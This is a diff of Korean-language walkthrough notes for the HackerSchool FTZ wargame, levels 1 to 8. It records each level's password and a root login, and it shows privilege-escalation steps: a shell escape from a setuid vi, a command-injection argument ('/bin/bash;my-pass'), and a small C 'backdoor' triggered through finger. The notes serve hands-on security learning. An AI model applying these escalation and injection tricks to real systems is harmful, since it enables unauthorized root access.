@@ -1,3 +1,6 @@
+redhat id : root
+redhat pw : hackerschool
+
 id : trainer1
 pw : trainer1
 
@@ -48,12 +51,107 @@ explanation :
 - find / -user level3 -perm -4000 2>/dev/null
 - cd /usr/bin
 - ls editor
+- ./editor
 - :!/bin/bash
-- my-pass:
+- my-pass
+
+해설 : ./editor를 실행하면 vi editor가 나오는데
+vi 에디터에서 !를 통해 외부 쉘을 실행 시킬 수 있어서 root권한이 있는
+bash파일로 이동후 my-pass를 통해 비밀번호를 알아낸다.
 
 id : level3
 pw : can you fly?
 explanation :
 - ls -alF
-- cat hint  fiel : autodig.txt -참-조
+- cat hint
+- find / -user level4 -perm -4000 2>/dev/null
 - cd /bin
+- ./autodig "/bin/bash;my-pass"
+
+해설 : autodig의 코드를 살펴보면 autodig에 인자값을 넣어 cmd를 돌릴 수
+있다는 것이 보인다. 그렇기 때문에 ./autodig 뒤에 "/bin/bash;my-pass"를 넣어
+패스워드를 얻는다.
+hint에서 보면 동시에 명령어를 사용하라는 건 한줄에 위처럼 두개의 명령어를 동시에 입력하기 위해
+;을 이용하라는 것이고, 문자열 형태는 코드보면 인자값으로 문자열을 넘겨야한다는걸 알 수 있다.
+따라서 넣으려는 값에 ""를 씌워주라는 것
+
+id : level4
+pw : suck my brain  백도어가 뭔지는 알고가자
+- ls -alF
+- cat hint
+- cd /etc/xineted.d/
+- ls -alF
+- cat backdoor
+- cd /home/level4/tmp
+- vi backdoor.c
+#include<stdio.h>
+#include<stdlib.h>
+
+int main(void){
+    system("my-pass");
+    return 0;
+}
+- gcc -o backdoor backdoor.c
+- finger @localhost
+
+해설 : cat을 해서 내용을 본 backdoor파일 안에 서버가 /home/level4/tmp라고 되어
+있는 것이 보인다 따라서 server 디렉토리에서 level5의 권한으로 backdoor를 실행해준다.
+그리고 finger @localhost 지정된 계정사용자 정보를 /etc/passwd 파일에서 읽어서 보여
+주는데 실행할 backdoor 파일이 없어 그냥 실행하면 오류가 나서 저런 c와 실행파일을 만들어준다.
+
+
+id : level5
+pw : what is your name?
+- ls -alF
+- cat hint
+- cd /usr/bin
+- ./level5
+- cd /tmp
+- ls -al (level5.tmp는 임시파일이라 안생겼을 거임)
+- touch level5.tmp
+- cd /usr/bin
+- ./level5
+- cd /tmp
+- cat level5.tmp
+
+해설 : level5를 실행하면 임시파일이 생긴다는 힌트와 달리 처음에 시도하면 없을 것이다.
+아마 임시파일이라 생겼다가 바로 없어지는 것으로 보고 우리가 임의로 만들어 준다.
+그 뒤에 다시 level5를 실행하고 tmp로 와서 level5.tmp를 확인하면 level6의 비밀번호 확인가능
+
+id : level6
+pw : what the hell
+그냥 들어가자 마자 ctrl + C를 누른다.
+- ls -alF
+- cat password
+
+해설 : 인포샵 bb의 텔넷을 해본적이 없어서 잘 모르겠지만 메뉴에서
+컨트롤 씨로 종료되어 우리가 아는 리눅스 창이 나오는 그런게 있었나보다.
+그래서 이것만하면 바로 패스워드를 얻을 수 있다.
+
+id : level7
+pw : come together
+일단 level7 로그인 전에 루트로 들어가서
+- cd /bin
+- cat > wrong.txt
+--_--_- --____- ---_-__ --__-_-
+을 해놓고 시작 (로컬로 서버를 열어서 제대로 안만들어짐)
+- ls -alF
+- cat hint
+- cd /bin   (이번 힌트에선 디렉토리가 지정이 안됐지만 bin이 제일 만만해서 대부분 bin임)
+- ./level7
+Insert The Password : 아무거나 입력
+--_--_- --____- ---_-__ --__-_-
+1101101 1100001 1110100 1100101
+109 97 116 101
+m a t e
+- ./level7
+Insert The Password : mate
+
+해설 : 제일 만만한 bin에 들어가서 뭐있는지 보면 그럴듯해보이는 level7을 실행함
+실행하면 비밀번호를 치는 데 잘못할 시 이상한 코드가 나옴 hint에서 2진수 10진수가 나왔고
+대충 _이게 0 -이게 1일거 같으니 그대로 풀고 10진수로 바꿔준다. 숫자가 여러개 나오는데
+48~57 & 65~90 & 97~122 면 ascii일것 같은 느낌적인 느낌이 온다. 따라서 아스키코드에 따라
+바꿔주면 mate가 나오고 끗
+
+id : level8
+pw : break the world
